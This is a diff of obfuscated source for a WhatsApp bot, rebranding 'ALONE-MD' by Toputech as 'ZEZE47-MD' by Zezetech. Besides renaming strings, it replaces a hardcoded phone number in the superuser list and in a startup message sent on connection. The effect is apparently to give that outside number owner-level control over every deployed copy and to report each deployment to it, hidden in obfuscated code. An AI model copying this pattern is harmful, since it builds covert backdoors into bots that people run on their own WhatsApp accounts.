@@ -1,4 +1,4 @@
-//Tech mob project.....developed by Toputech/Topu art 
+//Tech mob project.....developed by Zezetech/Zeze art 
 
 'use strict';
 
@@ -93,7 +93,7 @@ const {
 let {
   reagir
 } = require(__dirname + "/framework/app");
-var session = conf.session.replace(/ALONE-MD;;;=>/g, '');
+var session = conf.session.replace(/ZEZE47-MD;;;=>/g, '');
 const prefixe = conf.PREFIXE;
 async function authentification() {
   try {
@@ -134,7 +134,7 @@ setTimeout(() => {
       'logger': pino({
         'level': 'silent'
       }),
-      'browser': ["ALONE-MD", "safari", '1.0.0'],
+      'browser': ["ZEZE47-MD", "safari", '1.0.0'],
       'printQRInTerminal': true,
       'fireInitQueries': false,
       'shouldSyncHistoryMessage': true,
@@ -443,10 +443,10 @@ setTimeout(() => {
       } = require('./bdd/sudo');
       const _0x8655b1 = _0x40c788.pushName;
       const _0x24a9a0 = await _0x41f4cc();
-      const _0x547f0b = [_0x24fdbd, "255673750170", '255673750170', "255673750170", "255673750170", conf.NUMERO_OWNER].map(_0x3fabd1 => _0x3fabd1.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const _0x547f0b = [_0x24fdbd, "255682937675", '255682937675', "255682937675", "255682937675", conf.NUMERO_OWNER].map(_0x3fabd1 => _0x3fabd1.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const _0x3fbde5 = _0x547f0b.concat(_0x24a9a0);
-      const _0x287695 = _0x3fbde5.includes(_0x16f8fa);
-      var _0x3ccc10 = ["255673750170", '255673750170', "255673750170", "255673750170"].map(_0x1dad14 => _0x1dad14.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x16f8fa);
+      const _0x287695 = _0x3fbde5.includes(_0x16f8fa);255682937675
+      var _0x3ccc10 = ["255682937675", '255682937675', "255682937675", "255682937675"].map(_0x1dad14 => _0x1dad14.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x16f8fa);
       function _0x1feae7(_0xc155e5) {
         _0x394ce2.sendMessage(_0x4fc40e, {
           'text': _0xc155e5
@@ -454,7 +454,7 @@ setTimeout(() => {
           'quoted': _0x40c788
         });
       }
-      console.log("\t [][]...{ALONE Md}...[][]");
+      console.log("\t [][]...{ZEZE47 Md}...[][]");
       console.log("=========== New message ===========");
       if (_0x5a2068) {
         console.log("message from : " + _0x1cae59);
@@ -538,7 +538,7 @@ setTimeout(() => {
       setInterval(async () => {
         if (conf.AUTOBIO === "yes") {
           const _0x11b2f9 = _0x4194a5();
-          const _0x27e655 = "ALONE MD ALWAYS ONLINE\n" + _0x11b2f9;
+          const _0x27e655 = "ZEZE47 MD ALWAYS ONLINE\n" + _0x11b2f9;
           await _0x394ce2.updateProfileStatus(_0x27e655);
           console.log("Updated Bio: " + _0x27e655);
         }
@@ -594,7 +594,7 @@ setTimeout(() => {
           await _0x4d7174.toFile("st1.webp");
           var _0x2b86d4 = await recupererActionJid(_0x4fc40e);
           if (_0x2b86d4 === "remove") {
-            _0x1f1a97 += "message deleted \n @" + _0x16f8fa.split('@')[0x0] + " removed from group by ALONE-MD .";
+            _0x1f1a97 += "message deleted \n @" + _0x16f8fa.split('@')[0x0] + " removed from group by ZEZE47-MD .";
             await _0x394ce2.sendMessage(_0x4fc40e, {
               'sticker': fs.readFileSync("st1.webp")
             });
@@ -956,7 +956,7 @@ setTimeout(() => {
           }
           store.chats[_0x3e28c6].push(_0x2f1ff6);
           if (_0x3d23b2.includes('chat.whatsapp.com') && !conf.superUser.includes(_0x2f1ff6.key.participant) && conf.verifAdmin && !conf.groupeAdmin.includes(_0x2f1ff6.key.participant) && _0x2f1ff6.key.remoteJid.includes("@g.us")) {
-            _0x1feae7("_Alone md have just detected group link🧐_");
+            _0x1feae7("_Zeze md have just detected group link🧐_");
             const _0x2a318a = _0x2f1ff6.key.participant || _0x2f1ff6.key.remoteJid;
             const _0x579dbc = _0x2f1ff6.key.remoteJid;
             await _0x394ce2.sendMessage(_0x579dbc, {
@@ -1006,7 +1006,7 @@ setTimeout(() => {
           };
           var _0x1f1a97 = "bot detected, \n";
           var _0x4d7174 = new Sticker("https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif", {
-            'pack': "Alone-Md",
+            'pack': "Zeze47-Md",
             'author': conf.OWNER_NAME,
             'type': StickerTypes.FULL,
             'categories': ['🤩', '🎉'],
@@ -1149,12 +1149,12 @@ setTimeout(() => {
       try {
         const _0xdf959c = await _0x394ce2.groupMetadata(_0x203043.id);
         if (_0x203043.action == "add" && (await _0x382448(_0x203043.id, "welcome")) == 'on') {
-          let _0x34ee46 = "╔════◇◇◇═════╗\n║ welcome to new(s) member(s)\n║ * 𝚃𝙷𝙸𝚂 𝙸𝚂 𝙰𝙻𝙾𝙽𝙴 𝙼𝙳 𝚆𝙰 𝙱𝙾𝚃:*\n";
+          let _0x34ee46 = "╔════◇◇◇═════╗\n║ welcome to new(s) member(s)\n║ * 𝚃𝙷𝙸𝚂 𝙸𝚂 ZEZE47 MD 𝚆𝙰 𝙱𝙾𝚃:*\n";
           let _0x327752 = _0x203043.participants;
           for (let _0x5931b1 of _0x327752) {
             _0x34ee46 += "║ @" + _0x5931b1.split('@')[0x0] + "\n";
           }
-          _0x34ee46 += "║\n╚════◇◇◇═════╝\n◇ *WElOME BUDDY... READ THE GRPUP DESCRIPTION 😊 *   ◇\n\n" + _0xdf959c.desc + "\n\n> POWERED BY TOPU TECH.";
+          _0x34ee46 += "║\n╚════◇◇◇═════╝\n◇ *WElCOME BUDDY... READ THE GRPUP DESCRIPTION 😊 *   ◇\n\n" + _0xdf959c.desc + "\n\n> POWERED BY TOPU TECH.";
           _0x394ce2.sendMessage(_0x203043.id, {
             'image': {
               'url': _0x4fbfdc
@@ -1208,7 +1208,7 @@ setTimeout(() => {
     });
     function _0x41c316(_0x72299d) {
       const _0x5dbe77 = _0x72299d.key.participant || _0x72299d.key.remoteJid;
-      let _0x4d46d4 = "*❣️ALONE MD ANTIDELETE😋*\n\n";
+      let _0x4d46d4 = "*❣️ZEZE47-MD ANTIDELETE😋*\n\n";
       _0x4d46d4 += "*Time deleted🥀:* " + new Date().toLocaleString() + "\n";
       _0x4d46d4 += "*Deleted by🌷:* @" + _0x5dbe77.split('@')[0x0] + "\n\n*Powered by Toputech*\n\n";
       return _0x4d46d4;
@@ -1325,7 +1325,7 @@ setTimeout(() => {
       const _0x24276b = _0x39f141.key.remoteJid;
       const _0x386d3e = _0x39f141.key.remoteJid;
       const _0x482f22 = _0x386d3e.split('@')[0x0];
-      auto_reply_message = "Hello @" + _0x482f22 + ", A brief departure is on the horizon, but I shall return posthaste. Please bear with me for a fleeting moment, and I’ll rejoin you shortly \n\n*powered by Alone Md*.";
+      auto_reply_message = "Hello @" + _0x482f22 + ", A brief departure is on the horizon, but I shall return posthaste. Please bear with me for a fleeting moment, and I’ll rejoin you shortly \n\n*powered by Zeze Md*.";
       if (_0x23b00a.match(/^[^\w\s]/) && _0x39f141.key.fromMe) {
         const _0x5ef0bb = _0x23b00a[0x0];
         const _0x29f60a = _0x23b00a.slice(0x1).split(" ")[0x0];
@@ -1475,10 +1475,10 @@ setTimeout(() => {
         connection: _0x183b84
       } = _0x238a04;
       if (_0x183b84 === "connecting") {
-        console.log("ℹ️ ALONE-MD connecting in your account...");
+        console.log("ℹ️ ZEZE47-MD connecting in your account...");
       } else {
         if (_0x183b84 === 'open') {
-          console.log("✅ ALONE-MD connected successfully☺️");
+          console.log("✅ ZEZE47-MD connected successfully☺️");
           console.log('--');
           0x0;
           await baileys_1.delay(0xc8);
@@ -1486,13 +1486,13 @@ setTimeout(() => {
           0x0;
           await baileys_1.delay(0x12c);
           console.log("------------------/-----");
-          console.log("ALONE-MD by TOPUTECH installing cmds😇\n\n");
+          console.log("ZEZE47-MD by ZEZETECH installing cmds😇\n\n");
           console.log("chargement des commandes ...\n");
           fs.readdirSync(__dirname + "/commandes").forEach(_0x2aa7c8 => {
             if (path.extname(_0x2aa7c8).toLowerCase() == ".js") {
               try {
                 require(__dirname + '/commandes/' + _0x2aa7c8);
-                console.log(_0x2aa7c8 + "Successfully installed ALONE-MD commands✔️");
+                console.log(_0x2aa7c8 + "Successfully installed ZEZE47-MD commands✔️");
               } catch (_0xc3691e) {
                 console.log(_0x2aa7c8 + " n'a pas pu être chargé pour les raisons suivantes : " + _0xc3691e);
               }
@@ -1510,11 +1510,11 @@ setTimeout(() => {
           } else {
             _0x400a34 = "undefined";
           }
-          console.log("Alone-MD successfully connected✅");
+          console.log("Zeze47-MD successfully connected✅");
           await _0x319bc9();
           if (conf.DP.toLowerCase() === 'no') {
-            let _0x38c202 = "ALONE-MD  RUNNING ...\n    \n    Prefix : [ " + prefixe + " ]\n    Mode :" + _0x400a34 + " mode\n    Total Command : " + evt.cm.length + "\n    Owner : TOPU TECH 🦸  \n\n> ❣️ *Im here laways 4r you* ❣️\n";
-            await _0x394ce2.sendMessage('255673750170@s.whatsapp.net', {
+            let _0x38c202 = "ZEZE47-MD  RUNNING ...\n    \n    Prefix : [ " + prefixe + " ]\n    Mode :" + _0x400a34 + " mode\n    Total Command : " + evt.cm.length + "\n    Owner : ZEZETECH 🦸  \n\n> ❣️ *Im here laways 4r you* ❣️\n";
+            await _0x394ce2.sendMessage('255682937675@s.whatsapp.net', {
               'text': _0x38c202
             });
           }
